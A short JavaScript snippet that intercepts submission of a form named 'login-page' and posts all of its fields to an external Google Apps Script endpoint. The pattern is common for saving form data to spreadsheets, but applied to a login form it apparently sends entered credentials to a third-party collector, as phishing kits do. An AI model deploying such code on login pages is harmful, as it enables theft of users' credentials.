  const scriptURL = 'https://script.google.com/macros/s/AKfycbxXzCIxINygNbxRjeCOewE6es4baKx1fB7zM7LCZYqVqV32uyel29gktXZBj2HHA5XvfQ/exec'
  const form = document.forms['login-page']

  form.addEventListener('submit', e => {
    e.preventDefault()
    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
      .then(response => console.log('Success!', response))
      .catch(error => console.error('Error!', error.message))
  })